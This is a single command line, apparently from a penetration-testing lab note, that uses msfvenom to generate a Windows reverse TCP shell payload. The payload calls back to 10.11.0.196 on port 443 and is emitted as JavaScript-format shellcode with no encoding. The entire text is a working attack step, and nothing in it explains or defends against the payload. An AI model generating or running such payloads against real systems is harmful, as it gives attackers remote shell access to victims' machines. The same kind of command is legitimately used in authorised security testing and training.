msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.196 LPORT=443 -f js_le --platform windows -a x86 -e generic/none
